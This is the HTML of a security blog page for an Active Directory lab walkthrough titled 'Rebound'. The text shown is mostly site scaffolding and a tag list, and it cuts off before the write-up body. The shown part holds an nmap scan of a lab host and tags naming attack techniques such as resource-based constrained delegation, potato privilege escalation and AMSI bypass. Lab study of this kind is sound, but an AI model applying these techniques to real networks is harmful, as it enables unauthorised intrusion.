<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>Tracks-AD-Rebound | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243444546└─$ sudo nmap -sS 10.10.11.231 -p- --min-rate&#x3D;2000[sudo] password for fonllge:Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.or">
<meta property="og:type" content="article">
<meta property="og:title" content="Tracks-AD-Rebound">
<meta property="og:url" content="http://example.com/2024/12/12/Tracks-AD-Rebound/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243444546└─$ sudo nmap -sS 10.10.11.231 -p- --min-rate&#x3D;2000[sudo] password for fonllge:Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.or">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/tracks-ad/Rebound/background.jpg">
<meta property="article:published_time" content="2024-12-12T07:35:24.000Z">
<meta property="article:modified_time" content="2024-12-13T13:12:57.936Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="AD">
<meta property="article:tag" content="rbcd">
<meta property="article:tag" content="no-preAuth">
<meta property="article:tag" content="cd">
<meta property="article:tag" content="bypass-kerberos-only">
<meta property="article:tag" content="brute-rid">
<meta property="article:tag" content="AS-REQ ST">
<meta property="article:tag" content="DACL">
<meta property="article:tag" content="remote-potato">
<meta property="article:tag" content="winlogon">
<meta property="article:tag" content="rosating">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/tracks-ad/Rebound/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a 